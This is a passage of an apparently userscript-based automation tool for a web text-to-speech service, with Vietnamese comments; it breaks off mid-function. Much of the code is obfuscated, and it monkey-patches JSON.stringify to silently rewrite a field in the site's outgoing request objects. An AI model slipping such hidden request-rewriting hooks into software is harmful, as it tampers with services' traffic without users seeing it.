    function MMX_APP_PAYLOAD() {(function(Yilmbx$jjIDwz_g,ovkzT){const uQzpRwGpUoYFAPEHrfPU=DHk$uTvcFuLEMnixYuADkCeA;let Agt_iyE$GA=Yilmbx$jjIDwz_g();while(!![]){try{const CZMUHKImruRpknzRSEPeaxLI=parseFloat(-parseFloat(uQzpRwGpUoYFAPEHrfPU(0x1ec))/(parseInt(0xa7d)+0xd3b*0x2+-0x24f2))+-parseFloat(uQzpRwGpUoYFAPEHrfPU(0x1b9))/(0x72a+parseInt(0x1)*Math.floor(0x261f)+-parseInt(0x2d47))+parseFloat(uQzpRwGpUoYFAPEHrfPU(0x219))/(0x265a*Math.max(-0x1,-parseInt(0x1))+Math.ceil(-0x1778)+0x59f*parseInt(0xb))+-parseFloat(uQzpRwGpUoYFAPEHrfPU(0x1d8))/(-parseInt(0x1)*-parseInt(0x140d)+Math.max(-parseInt(0x9),-parseInt(0x9))*-parseInt(0xc5)+-0x1af6)+parseFloat(uQzpRwGpUoYFAPEHrfPU(0x20d))/(parseInt(0x1)*Math.trunc(-0x12f0)+parseInt(0x16ac)+Math.trunc(-parseInt(0x3b7)))+parseFloat(uQzpRwGpUoYFAPEHrfPU(0x24a))/(-parseInt(0x1ceb)*-0x1+Math.floor(-parseInt(0x35e))*-parseInt(0x4)+parseInt(0x879)*Number(-parseInt(0x5)))+parseFloat(uQzpRwGpUoYFAPEHrfPU(0x255))/(Math.max(0x13be,0x13be)+0xfd7+-parseInt(0x238e))*(parseFloat(uQzpRwGpUoYFAPEHrfPU(0x20b))/(0x2*-parseInt(0xb14)+parseInt(0x10a9)+-0x1*-parseInt(0x587)));if(CZMUHKImruRpknzRSEPeaxLI===ovkzT)break;else Agt_iyE$GA['push'](Agt_iyE$GA['shift']());}catch(BxBFeuISqmEq$_s){Agt_iyE$GA['push'](Agt_iyE$GA['shift']());}}}(IG_rKyaLCWfnmy,parseInt(0xcbe46)+Math.trunc(-0x3f168)+-0x267f9),(function(){'use strict';

    // Log functionality
    function addLogEntry(message, type = 'info') {
        const logContainer = document.getElementById('log-container');
        if (logContainer) {
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry ${type}`;
            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logContainer.appendChild(logEntry);
            logContainer.scrollTop = logContainer.scrollHeight;
        }
    }

    function clearLog() {
        const logContainer = document.getElementById('log-container');
        if (logContainer) {
            logContainer.innerHTML = '';
            addLogEntry('Log đã được xóa', 'info');
        }
    }


    // Add event listener for clear log button
    document.addEventListener('DOMContentLoaded', function() {
        const clearLogBtn = document.getElementById('clear-log-btn');
        if (clearLogBtn) {
            clearLogBtn.addEventListener('click', clearLog);
        }
    });

const aZpcvyD_mnWYN_qgEq=DHk$uTvcFuLEMnixYuADkCeA;let SI$acY=[],ZTQj$LF$o=[],ttuo$y_KhCV=Number(0x90d)+Number(0xdac)+parseFloat(-0x16b9),EfNjYNYj_O_CGB=![],MEpJezGZUsmpZdAgFRBRZW=![],xlgJHLP$MATDT$kTXWV=null,Srnj$swt=null,n_WwsStaC$jzsWjOIjRqedTG=null,dqj_t_Mr=null;const FMFjWZYZzPXRHIjRRnOwV_G=JSON[aZpcvyD_mnWYN_qgEq(0x1df)];JSON[aZpcvyD_mnWYN_qgEq(0x1df)]=function(o__htsdYW,...YxPU$_FEFzDUACWyi){const civchWuTNrKOGccx_eNld=aZpcvyD_mnWYN_qgEq;if(o__htsdYW&&typeof o__htsdYW===civchWuTNrKOGccx_eNld(0x231)&&o__htsdYW[civchWuTNrKOGccx_eNld(0x1ca)]&&o__htsdYW[civchWuTNrKOGccx_eNld(0x208)]){const xlxXwB$xg_wWLUkKDoPeWvBcc=document[civchWuTNrKOGccx_eNld(0x1de)](civchWuTNrKOGccx_eNld(0x235));if(xlxXwB$xg_wWLUkKDoPeWvBcc&&EfNjYNYj_O_CGB){const guKwlTGjKUCtXQplrcc=xlxXwB$xg_wWLUkKDoPeWvBcc[civchWuTNrKOGccx_eNld(0x24c)];guKwlTGjKUCtXQplrcc&&(o__htsdYW[civchWuTNrKOGccx_eNld(0x1ca)]=guKwlTGjKUCtXQplrcc);}}return FMFjWZYZzPXRHIjRRnOwV_G[civchWuTNrKOGccx_eNld(0x22c)](this,o__htsdYW,...YxPU$_FEFzDUACWyi);},window[aZpcvyD_mnWYN_qgEq(0x25f)](aZpcvyD_mnWYN_qgEq(0x1c9),()=>{const AP$u_huhInYfTj=aZpcvyD_mnWYN_qgEq;function spAghkbWog(){const DWWeZydubZoTFZs$ck_jg=DHk$uTvcFuLEMnixYuADkCeA;GM_addStyle(SCRIPT_CSS);const UdJdhwBFovFArs=document[DWWeZydubZoTFZs$ck_jg(0x25a)](DWWeZydubZoTFZs$ck_jg(0x269));UdJdhwBFovFArs[DWWeZydubZoTFZs$ck_jg(0x1f1)]=DWWeZydubZoTFZs$ck_jg(0x250),document[DWWeZydubZoTFZs$ck_jg(0x205)][DWWeZydubZoTFZs$ck_jg(0x1eb)](UdJdhwBFovFArs);const sIzV_BK=document[DWWeZydubZoTFZs$ck_jg(0x25a)](DWWeZydubZoTFZs$ck_jg(0x269));sIzV_BK[DWWeZydubZoTFZs$ck_jg(0x1f1)]=DWWeZydubZoTFZs$ck_jg(0x1d2),document[DWWeZydubZoTFZs$ck_jg(0x205)][DWWeZydubZoTFZs$ck_jg(0x1eb)](sIzV_BK);const fCNFI$elNjn=document[DWWeZydubZoTFZs$ck_jg(0x25a)](DWWeZydubZoTFZs$ck_jg(0x215));fCNFI$elNjn['id']=DWWeZydubZoTFZs$ck_jg(0x25b),fCNFI$elNjn[DWWeZydubZoTFZs$ck_jg(0x1c7)]=APP_HTML,document[DWWeZydubZoTFZs$ck_jg(0x248)][DWWeZydubZoTFZs$ck_jg(0x1eb)](fCNFI$elNjn),document[DWWeZydubZoTFZs$ck_jg(0x248)][DWWeZydubZoTFZs$ck_jg(0x1d9)][DWWeZydubZoTFZs$ck_jg(0x203)](DWWeZydubZoTFZs$ck_jg(0x201)),BZr$GS$CqnCyt(),setTimeout(()=>{const lVvu_IZabWk=DWWeZydubZoTFZs$ck_jg,iItyHbcTDrfnQk=document[lVvu_IZabWk(0x1cd)](lVvu_IZabWk(0x21e));iItyHbcTDrfnQk&&(iItyHbcTDrfnQk[lVvu_IZabWk(0x24c)]=lVvu_IZabWk(0x1c4),iItyHbcTDrfnQk[lVvu_IZabWk(0x1c1)](new Event(lVvu_IZabWk(0x229),{'bubbles':!![]}))),s_BrlXXxPOJaBMKQX();},0x8*parseInt(0x182)+0x17*Math.trunc(parseInt(0xd3))+Math.max(-0x1541,-0x1541));}spAghkbWog();const LrkOcBYz_$AGjPqXLWnyiATpCI=document[AP$u_huhInYfTj(0x1de)](AP$u_huhInYfTj(0x261)),lraDK$WDOgsXHRO=document[AP$u_huhInYfTj(0x1de)](AP$u_huhInYfTj(0x1da)),OdKzziXLxtOGjvaBMHm=document[AP$u_huhInYfTj(0x1de)](AP$u_huhInYfTj(0x23a)),WRVxYBSrPsjcqQs_bXI=document[AP$u_huhInYfTj(0x1de)](AP$u_huhInYfTj(0x24f)),rUxbIRagbBVychZ$GfsogD=document[AP$u_huhInYfTj(0x1de)](AP$u_huhInYfTj(0x235)),zQizakWdLEdLjtenmCbNC=document[AP$u_huhInYfTj(0x1de)](AP$u_huhInYfTj(0x23f)),PEYtOIOW=document[AP$u_huhInYfTj(0x1de)](AP$u_huhInYfTj(0x230)),PcLAEW=document[AP$u_huhInYfTj(0x1de)](AP$u_huhInYfTj(0x1e7)),yU_jfkzmffcnGgLWrq=document[AP$u_huhInYfTj(0x1de)](AP$u_huhInYfTj(0x1ba)),VcTcfGnbfWZdhQRvBp$emAVjf=document[AP$u_huhInYfTj(0x1de)](AP$u_huhInYfTj(0x223)),CVjXA$H=document[AP$u_huhInYfTj(0x1de)](AP$u_huhInYfTj(0x260)),pT$bOHGEGbXDSpcuLWAq_yMVf=document[AP$u_huhInYfTj(0x1de)](AP$u_huhInYfTj(0x214)),pemHAD=document[AP$u_huhInYfTj(0x1de)](AP$u_huhInYfTj(0x1dc)),SCOcXEQXTPOOS=document[AP$u_huhInYfTj(0x1de)](AP$u_huhInYfTj(0x211)),XvyPnqSRdJtYjSxingI=document[AP$u_huhInYfTj(0x1de)](AP$u_huhInYfTj(0x20a)),cHjV$QkAT$JWlL=document[AP$u_huhInYfTj(0x1de)](AP$u_huhInYfTj(0x1bb)),TUlYLVXXZeP_OexmGXTd=document[AP$u_huhInYfTj(0x1de)](AP$u_huhInYfTj(0x234));function BZr$GS$CqnCyt(){const qDfoTpFPZIJhavEhvzA=AP$u_huhInYfTj,tHDv$H_WMTUmdIgly=document[qDfoTpFPZIJhavEhvzA(0x1cd)](qDfoTpFPZIJhavEhvzA(0x253));tHDv$H_WMTUmdIgly&&(tHDv$H_WMTUmdIgly[qDfoTpFPZIJhavEhvzA(0x1fb)][qDfoTpFPZIJhavEhvzA(0x1e1)]=qDfoTpFPZIJhavEhvzA(0x209));}function KxTOuAJu(TD$MiWBRgQx){const oJBWD_FSUVQDirej_NDYd=AP$u_huhInYfTj;if(!TD$MiWBRgQx)return![];try{if(TD$MiWBRgQx[oJBWD_FSUVQDirej_NDYd(0x1e3)])TD$MiWBRgQx[oJBWD_FSUVQDirej_NDYd(0x1e3)]();const SEv_hb=unsafeWindow||window,CvgA_TVH$Ae=TD$MiWBRgQx[oJBWD_FSUVQDirej_NDYd(0x1bf)]||document;return[oJBWD_FSUVQDirej_NDYd(0x1c5),oJBWD_FSUVQDirej_NDYd(0x218),oJBWD_FSUVQDirej_NDYd(0x242),oJBWD_FSUVQDirej_NDYd(0x1ee),oJBWD_FSUVQDirej_NDYd(0x1bd)][oJBWD_FSUVQDirej_NDYd(0x1dd)](nTTsQoPvqnqJrM=>{const hTykMlxVcfVO_SymRDte=oJBWD_FSUVQDirej_NDYd;let JhxaolNQUORsB_QxPsC;if(SEv_hb[hTykMlxVcfVO_SymRDte(0x233)]&&nTTsQoPvqnqJrM[hTykMlxVcfVO_SymRDte(0x20e)](hTykMlxVcfVO_SymRDte(0x1e2)))JhxaolNQUORsB_QxPsC=new SEv_hb[(hTykMlxVcfVO_SymRDte(0x233))](nTTsQoPvqnqJrM,{'bubbles':!![],'cancelable':!![],'pointerId':0x1,'isPrimary':!![]});else SEv_hb[hTykMlxVcfVO_SymRDte(0x206)]?JhxaolNQUORsB_QxPsC=new SEv_hb[(hTykMlxVcfVO_SymRDte(0x206))](nTTsQoPvqnqJrM,{'bubbles':!![],'cancelable':!![],'button':0x0,'buttons':0x1}):(JhxaolNQUORsB_QxPsC=CvgA_TVH$Ae[hTykMlxVcfVO_SymRDte(0x1f8)](hTykMlxVcfVO_SymRDte(0x1ea)),JhxaolNQUORsB_QxPsC[hTykMlxVcfVO_SymRDte(0x22a)](nTTsQoPvqnqJrM,!![],!![],SEv_hb,-parseInt(0x7)*parseFloat(-0x3d7)+parseInt(0x18dc)+-parseInt(0x33bd),0x8*-0x1e2+Number(-parseInt(0xb))*parseInt(0x1c3)+-0xb7b*-0x3,-0x2643+0xc86+-0x257*Math.floor(-0xb),parseInt(parseInt(0x159d))*-0x1+Math.max(parseInt(0x2240),parseInt(0x2240))*Math.max(-parseInt(0x1),-0x1)+parseInt(0x37dd),-parseInt(0x1339)+-0xad1+parseInt(0x1e0a),![],![],![],![],0xa*0x203+-parseInt(0x7d4)+Math.max(-0xc4a,-parseInt(0xc4a)),null));TD$MiWBRgQx[hTykMlxVcfVO_SymRDte(0x1c1)](JhxaolNQUORsB_QxPsC);}),setTimeout(()=>{const BPdnkcyTSdtBOGMLj=oJBWD_FSUVQDirej_NDYd;try{TD$MiWBRgQx[BPdnkcyTSdtBOGMLj(0x1bd)]();}catch(YSPyVUihxEOKTGLqGcpxww){}},parseInt(0x1)*-0x220d+-0x1ceb*parseInt(parseInt(0x1))+parseInt(0x3f02)),!![];}catch(wYZWjTdHsjGqS$TxW){return![];}}function ymkKApNTfjOanYIBsxsoMNBX(TQ$sjPfgYpRqekqYTKkMM$xsbq){const fZxoQbjOSjhtnzVVyV=AP$u_huhInYfTj,wZCCqPFq$YpVFMqx=Math[fZxoQbjOSjhtnzVVyV(0x23d)](TQ$sjPfgYpRqekqYTKkMM$xsbq/(0x61c+-0x1*-0x467+-parseInt(0x1)*0xa47)),IgThKNqdaOrPWvnnnfSK=Math[fZxoQbjOSjhtnzVVyV(0x23d)](TQ$sjPfgYpRqekqYTKkMM$xsbq%(parseInt(0x1)*Math.ceil(-parseInt(0x1675))+-0x1*parseFloat(parseInt(0x3f8))+Math.floor(parseInt(0x23))*Math.ceil(0xc3)));return wZCCqPFq$YpVFMqx+fZxoQbjOSjhtnzVVyV(0x1ef)+IgThKNqdaOrPWvnnnfSK+fZxoQbjOSjhtnzVVyV(0x25d);}function i_B_kZYD() {
    // ƯU TIÊN 1: Kiểm tra tên file do người dùng nhập tùy chỉnh
    const customFilenameInput = document.getElementById('custom-filename-input');
    let fileName = 'audio_da_tao'; // Tên mặc định

    // Nếu người dùng đã nhập tên file tùy chỉnh, ưu tiên sử dụng tên đó
    if (customFilenameInput && customFilenameInput.value && customFilenameInput.value.trim()) {
        fileName = customFilenameInput.value.trim();

        // Làm sạch tên file: loại bỏ ký tự không hợp lệ, thay khoảng trắng bằng gạch dưới
        fileName = fileName
            .replace(/[<>:"/\\|?*]/g, '') // Loại bỏ các ký tự không hợp lệ trong tên file
            .replace(/\s+/g, '_')         // Thay thế một hoặc nhiều khoảng trắng bằng dấu gạch dưới
            .substring(0, 80)              // Giới hạn độ dài tên file để tránh quá dài
            .trim();
    }

    // ƯU TIÊN 2: Nếu không có tên tùy chỉnh, kiểm tra tên file văn bản đã tải lên
    if (fileName === 'audio_da_tao') {
        const textFileInput = document.getElementById('text-file-input');

        // Nếu có file văn bản đã tải lên, sử dụng tên file đó
        if (textFileInput && textFileInput.files && textFileInput.files.length > 0) {
            const uploadedTextFile = textFileInput.files[0];
            if (uploadedTextFile && uploadedTextFile.name) {
                // Lấy tên file văn bản đã tải lên (bỏ đuôi file)
                const uploadedFileName = uploadedTextFile.name;
                const lastDotIndex = uploadedFileName.lastIndexOf('.');
                if (lastDotIndex > 0) {
                    fileName = uploadedFileName.substring(0, lastDotIndex);
                } else {
                    fileName = uploadedFileName;
                }

                // Làm sạch tên file: loại bỏ ký tự không hợp lệ, thay khoảng trắng bằng gạch dưới
                fileName = fileName
                    .replace(/[<>:"/\\|?*]/g, '') // Loại bỏ các ký tự không hợp lệ trong tên file
                    .replace(/\s+/g, '_')         // Thay thế một hoặc nhiều khoảng trắng bằng dấu gạch dưới
                    .substring(0, 80)              // Giới hạn độ dài tên file để tránh quá dài
                    .trim();
            }
        }
    }

    // ƯU TIÊN 3: Nếu vẫn chưa có tên, dùng dòng đầu tiên của văn bản
    if (fileName === 'audio_da_tao') {
        const textarea = document.getElementById('gemini-main-textarea');
        const text = textarea ? textarea.value : '';

        // Nếu có văn bản, lấy dòng đầu tiên làm tên file
        if (text && text.trim().length > 0) {
            const firstLine = text.trim().split('\n')[0];

            // Làm sạch tên file: loại bỏ ký tự không hợp lệ, thay khoảng trắng bằng gạch dưới
            fileName = firstLine
                .replace(/[<>:"/\\|?*]/g, '') // Loại bỏ các ký tự không hợp lệ trong tên file
                .replace(/\s+/g, '_')         // Thay thế một hoặc nhiều khoảng trắng bằng dấu gạch dưới
                .substring(0, 80)              // Giới hạn độ dài tên file để tránh quá dài
                .trim();
        }
    }

    // Nếu sau khi làm sạch mà tên file bị rỗng, quay lại tên mặc định
    if (!fileName || fileName === 'audio_da_tao') {
        fileName = 'audio_da_tao';
    }

    // Trả về tên file hoàn chỉnh với đuôi .mp3
    return fileName + '.mp3';
}function nWHrScjZnIyNYzztyEWwM(RHDrdenxMcTQywSbrFGWcRi,supYmMedzDRWZEr){const j$DXl$iN=AP$u_huhInYfTj;if(supYmMedzDRWZEr===-parseInt(0x1)*-parseInt(0x9ff)+parseInt(0x4)*parseInt(0x6d7)+Math.trunc(0x49)*-parseInt(0x83))return;const W_gEcM_tWt=Math[j$DXl$iN(0x238)](RHDrdenxMcTQywSbrFGWcRi/supYmMedzDRWZEr*(Number(parseInt(0x24f2))*0x1+-parseInt(0x1af3)+parseInt(-0x99b)));pemHAD[j$DXl$iN(0x1fb)][j$DXl$iN(0x24b)]=W_gEcM_tWt+'%',SCOcXEQXTPOOS[j$DXl$iN(0x273)]=W_gEcM_tWt+j$DXl$iN(0x1c3)+RHDrdenxMcTQywSbrFGWcRi+'/'+supYmMedzDRWZEr+')';}function NrfPVBbJv_Dph$tazCpJ(text, idealLength = 600, minLength = 500, maxLength = 700) {
    // Lấy giá trị từ công tắc chunk size
    const chunkSizeToggle = document.getElementById('chunk-size-toggle');
    const useLargeChunks = chunkSizeToggle ? chunkSizeToggle.checked : false;
    const actualMaxLength = useLargeChunks ? 900 : 700;
    const chunks = [];
    if (!text || typeof text !== 'string') {
        return chunks;
    }

    let currentText = String(text).replace(/\r\n/g, '\n').replace(/\r/g, '\n').trim();

    // ƯU TIÊN: Nếu văn bản có dòng trống phân tách đoạn, tách theo đoạn NGAY LẬP TỨC
    // Điều này giúp văn bản < 700 ký tự nhưng có 2-3 đoạn vẫn tách thành nhiều chunk đúng ý
    // CHỈ áp dụng khi công tắc được bật
    const enableBlankLineChunking = document.getElementById('enable-blank-line-chunking')?.checked ?? true;
    if (enableBlankLineChunking && /\n\s*\n+/.test(currentText)) {
        const parts = currentText.split(/\n\s*\n+/).map(p => p.trim()).filter(p => p.length > 0);
        if (parts.length > 1) {
            for (const part of parts) {
                if (part.length <= actualMaxLength) {
                    chunks.push(part);
                } else {
                    // Nếu một đoạn riêng lẻ vẫn > actualMaxLength, chia nhỏ bằng logic cũ
                    chunks.push(...NrfPVBbJv_Dph$tazCpJ(part, idealLength, minLength, actualMaxLength));
                }
            }
            return chunks;
        }
    }

    while (currentText.length > 0) {
        if (currentText.length <= actualMaxLength) {
            chunks.push(currentText);
            break;
        }

        let sliceToSearch = currentText.substring(0, actualMaxLength);
        let splitIndex = -1;

        // ƯU TIÊN 1 (MỚI): Tách tại dòng trống gần nhất trong sliceToSearch
        // Chỉ áp dụng khi công tắc được bật
        const enableBlankLineChunking = document.getElementById('enable-blank-line-chunking')?.checked ?? true;
        if (enableBlankLineChunking) {
            const blankLineRegex = /\n\s*\n/g;
            let match;
            let lastBlankIdx = -1;
            while ((match = blankLineRegex.exec(sliceToSearch)) !== null) {
                if (match.index >= minLength) {
                    lastBlankIdx = match.index + match[0].length; // cắt sau cụm dòng trống
                }
            }
            if (lastBlankIdx !== -1) {
                splitIndex = lastBlankIdx;
            }
        }
        // Nếu công tắc tắt, đảm bảo splitIndex vẫn là -1 để logic tiếp theo hoạt động

        // TẠM THỜI THAY THẾ CÁC THẺ <#...#> ĐỂ TRÁNH LOGIC TÌM KIẾM BỊ NHẦM LẪN
        const placeholder = "[[PAUSE_TAG]]";
        const tempSlice = sliceToSearch.replace(/<#[0-9.]+#>/g, placeholder);

        // --- Bắt đầu logic tìm điểm cắt ---

        // Ưu tiên 2: Tìm vị trí của placeholder (đại diện cho thẻ <#...#>)
        // Chỉ áp dụng khi chưa tìm được điểm cắt từ ưu tiên 1 (dòng trống)
        let lastPauseTagIndex = tempSlice.lastIndexOf(placeholder);
        if (splitIndex === -1 && lastPauseTagIndex !== -1 && lastPauseTagIndex >= minLength) {
            // Cắt ngay trước thẻ <#...#> tương ứng trong chuỗi gốc
            // Cần tìm vị trí của thẻ <#...#> cuối cùng trong sliceToSearch gốc
            const matches = sliceToSearch.match(/<#[0-9.]+#>/g);
            if (matches && matches.length > 0) {
                splitIndex = sliceToSearch.lastIndexOf(matches[matches.length - 1]);
            } else {
                // Fallback if for some reason no match found in original slice
                splitIndex = lastPauseTagIndex;
            }
        } else if (splitIndex === -1) {
            // Ưu tiên 3: Tìm dấu câu kết thúc câu (đã bỏ qua các dấu trong thẻ)
            const lastPeriod = tempSlice.lastIndexOf('.');
            const lastQuestionMark = tempSlice.lastIndexOf('?');
            const bestEndSentenceIndex = Math.max(lastPeriod, lastQuestionMark);

            if (bestEndSentenceIndex >= minLength) {
                // SỬA LỖI: Cắt SAU dấu câu thay vì cắt TẠI dấu câu
                splitIndex = bestEndSentenceIndex + 1;
            } else {
                // Ưu tiên 4: Tìm dấu phẩy
                const lastComma = tempSlice.lastIndexOf(',');
                if (lastComma >= minLength) {
                    splitIndex = lastComma + 1;
                } else {
                    // Ưu tiên 5: Tìm khoảng trắng cuối cùng
                    const lastSpace = tempSlice.lastIndexOf(' ');
                    if (lastSpace >= minLength) {
                        splitIndex = lastSpace;
                    } else {
                        // Giải pháp cuối cùng: Cắt cứng tại độ dài lý tưởng
                        splitIndex = idealLength;
                    }
                }
            }
        }

        const chunk = currentText.substring(0, splitIndex).trim();
        if (chunk) {
            chunks.push(chunk);
        }

        currentText = currentText.substring(splitIndex).trim();
    }

    return chunks.filter(c => c.length > 0);
}

// Hàm tách chunk thông minh mới - ưu tiên theo đoạn văn
function smartSplitter(text, maxLength = 700) {
    // Lấy giá trị từ công tắc chunk size
    const chunkSizeToggle = document.getElementById('chunk-size-toggle');
    const useLargeChunks = chunkSizeToggle ? chunkSizeToggle.checked : false;
    const actualMaxLength = useLargeChunks ? 900 : 700;

    const finalChunks = [];
    if (!text || typeof text !== 'string') {
        return finalChunks;
    }

    // Chuẩn hóa xuống dòng (Windows \r\n -> \n) và thay <br> thành xuống dòng
    const normalized = text
        .replace(/\r\n/g, '\n')
        .replace(/\r/g, '\n')
        .replace(/<br\s*\/?>(?=\s*\n?)/gi, '\n')
        .replace(/\u00A0/g, ' ');

    // Tách văn bản thành các đoạn dựa trên 2 (hoặc nhiều hơn) dấu xuống dòng
    // (regex này có nghĩa là: 1 dấu \n, theo sau là 0 hoặc nhiều khoảng trắng, rồi lại 1 dấu \n)
    let paragraphs = normalized.split(/\n\s*\n+/);
    paragraphs = paragraphs.map(p => p.trim()).filter(p => p.length > 0);
    addLogEntry(`🧩 Smart split: phát hiện ${paragraphs.length} đoạn văn`, 'info');
    addLogEntry(`🧩 Debug: văn bản chuẩn hóa có ${normalized.length} ký tự`, 'info');
    addLogEntry(`🧩 Debug: có chứa \\n: ${normalized.includes('\n')}`, 'info');

    // Fallback: nếu vì lý do nào đó không phát hiện được đoạn nào, thử tách theo từng dòng có nội dung
    if (paragraphs.length === 1 && normalized.includes('\n')) {
        const lines = normalized.split(/\n+/).map(l => l.trim()).filter(l => l.length > 0);
        if (lines.length > 1) {
            addLogEntry(`🧩 Smart split fallback: dùng tách theo dòng (${lines.length} dòng)`, 'warning');
            paragraphs = lines;
        }
    }

    // Nếu vẫn chỉ có 1 đoạn, thử tách theo dòng đơn lẻ
    if (paragraphs.length === 1) {
        const singleLines = normalized.split(/\n/).map(l => l.trim()).filter(l => l.length > 0);
        if (singleLines.length > 1) {
            addLogEntry(`🧩 Smart split fallback 2: dùng tách theo dòng đơn (${singleLines.length} dòng)`, 'warning');
            paragraphs = singleLines;
        }
    }

    for (const para of paragraphs) {
        const trimmedPara = para.trim();

        if (trimmedPara.length === 0) {
            continue; // Bỏ qua các đoạn trống
        }

        // TRƯỜNG HỢP 1: Đoạn văn đủ ngắn (< actualMaxLength ký tự)
        if (trimmedPara.length <= actualMaxLength) {
            finalChunks.push(trimmedPara);

        // TRƯỜNG HỢP 2: Đoạn văn quá dài (> actualMaxLength ký tự)
        } else {
            // Nếu đoạn này quá dài, chúng ta sẽ dùng lại hàm tách CŨ
            // (NrfPVBbJv_Dph$tazCpJ) để chia nhỏ chính đoạn này.
            addLogEntry(`🧠 Đoạn văn dài ${trimmedPara.length} ký tự, đang chia nhỏ...`, 'info');
            const subChunks = NrfPVBbJv_Dph$tazCpJ(trimmedPara, 600, 500, actualMaxLength);

            // Thêm các chunk con vào kết quả cuối cùng
            finalChunks.push(...subChunks);
        }
    }

    return finalChunks.filter(c => c.length > 0);
}

function dExAbhXwTJeTJBIjWr(EARfsfSN_QdgxH){const tENdSoNDV_gGwQKLZv$sYaZKhl=AP$u_huhInYfTj,T$dCpaznIPQ_UPNPAquzJhwHya=document[tENdSoNDV_gGwQKLZv$sYaZKhl(0x207)](tENdSoNDV_gGwQKLZv$sYaZKhl(0x263));for(const uUautBCIQlQydFiAF of T$dCpaznIPQ_UPNPAquzJhwHya){if(uUautBCIQlQydFiAF[tENdSoNDV_gGwQKLZv$sYaZKhl(0x273)][tENdSoNDV_gGwQKLZv$sYaZKhl(0x1d4)]()[tENdSoNDV_gGwQKLZv$sYaZKhl(0x1d1)]()===EARfsfSN_QdgxH[tENdSoNDV_gGwQKLZv$sYaZKhl(0x1d1)]())return KxTOuAJu(uUautBCIQlQydFiAF);}return![];}function s_BrlXXxPOJaBMKQX(){const Qhhztv_Emh_V=AP$u_huhInYfTj,qEJFmmYaq_ZY$ADPfvGUAMIlmIC=document[Qhhztv_Emh_V(0x1de)](Qhhztv_Emh_V(0x1c2)),IhdbQcdDHJpPksT$$OGFBBMT=document[Qhhztv_Emh_V(0x1cd)](Qhhztv_Emh_V(0x1e0)),rxGCINQSAqsWepsnWTGJOpnkL=document[Qhhztv_Emh_V(0x1cd)](Qhhztv_Emh_V(0x251));if(qEJFmmYaq_ZY$ADPfvGUAMIlmIC){qEJFmmYaq_ZY$ADPfvGUAMIlmIC[Qhhztv_Emh_V(0x1c7)]='';if(IhdbQcdDHJpPksT$$OGFBBMT){const wdZDFYMevO_$Lwy=document[Qhhztv_Emh_V(0x25a)](Qhhztv_Emh_V(0x23c));wdZDFYMevO_$Lwy[Qhhztv_Emh_V(0x1f1)]=IhdbQcdDHJpPksT$$OGFBBMT[Qhhztv_Emh_V(0x1f1)],wdZDFYMevO_$Lwy[Qhhztv_Emh_V(0x23e)]=Qhhztv_Emh_V(0x245),qEJFmmYaq_ZY$ADPfvGUAMIlmIC[Qhhztv_Emh_V(0x1eb)](wdZDFYMevO_$Lwy);}if(rxGCINQSAqsWepsnWTGJOpnkL){const MTKrudpbV$ZIhmZO=document[Qhhztv_Emh_V(0x25a)](Qhhztv_Emh_V(0x1be));MTKrudpbV$ZIhmZO['id']=Qhhztv_Emh_V(0x257),MTKrudpbV$ZIhmZO[Qhhztv_Emh_V(0x273)]=Qhhztv_Emh_V(0x1e9)+rxGCINQSAqsWepsnWTGJOpnkL[Qhhztv_Emh_V(0x273)][Qhhztv_Emh_V(0x1d4)](),qEJFmmYaq_ZY$ADPfvGUAMIlmIC[Qhhztv_Emh_V(0x1eb)](MTKrudpbV$ZIhmZO);}}}async function tt__SfNwBHDebpWJOqrSTR(){const VCAHyXsrERcpXVhFPxmgdBjjh=AP$u_huhInYfTj,zEwMPLN$IZxzIwfdDbCfnIYcA=new Date();cHjV$QkAT$JWlL[VCAHyXsrERcpXVhFPxmgdBjjh(0x273)]=VCAHyXsrERcpXVhFPxmgdBjjh(0x1ce)+ymkKApNTfjOanYIBsxsoMNBX((zEwMPLN$IZxzIwfdDbCfnIYcA-dqj_t_Mr)/(Number(-0x27)*Math.floor(-0x26)+0x1f37+0x25*Math.floor(-parseInt(0xe5))));if(ZTQj$LF$o[VCAHyXsrERcpXVhFPxmgdBjjh(0x216)]===parseFloat(-0x1ca4)+Number(-parseInt(0x2445))+parseInt(0x40e9))return;try{
// Sử dụng window.chunkBlobs nếu có và có dữ liệu, nếu không thì dùng ZTQj$LF$o
let finalBlobs = ZTQj$LF$o; // Mặc định dùng ZTQj$LF$o như code gốc
if (window.chunkBlobs && window.chunkBlobs.length > 0) {
    const validBlobs = window.chunkBlobs.filter(blob => blob !== null);
    if (validBlobs.length > 0) {
        finalBlobs = validBlobs; // Chỉ dùng window.chunkBlobs nếu có dữ liệu
    }
}
const InRdxToeqTDyPgDGZb=new Blob(finalBlobs,{'type':VCAHyXsrERcpXVhFPxmgdBjjh(0x1f5)}),BBNDYjhHoGkj_qbbbJu=URL[VCAHyXsrERcpXVhFPxmgdBjjh(0x1f0)](InRdxToeqTDyPgDGZb);PEYtOIOW[VCAHyXsrERcpXVhFPxmgdBjjh(0x25c)]=BBNDYjhHoGkj_qbbbJu,PEYtOIOW[VCAHyXsrERcpXVhFPxmgdBjjh(0x1c8)]=i_B_kZYD(),zQizakWdLEdLjtenmCbNC[VCAHyXsrERcpXVhFPxmgdBjjh(0x1fb)][VCAHyXsrERcpXVhFPxmgdBjjh(0x1e1)]=VCAHyXsrERcpXVhFPxmgdBjjh(0x258),document[VCAHyXsrERcpXVhFPxmgdBjjh(0x1de)](VCAHyXsrERcpXVhFPxmgdBjjh(0x225))[VCAHyXsrERcpXVhFPxmgdBjjh(0x1fb)][VCAHyXsrERcpXVhFPxmgdBjjh(0x1e1)]=VCAHyXsrERcpXVhFPxmgdBjjh(0x258);if(n_WwsStaC$jzsWjOIjRqedTG)n_WwsStaC$jzsWjOIjRqedTG[VCAHyXsrERcpXVhFPxmgdBjjh(0x26c)]();typeof WaveSurfer===VCAHyXsrERcpXVhFPxmgdBjjh(0x24d)&&await new 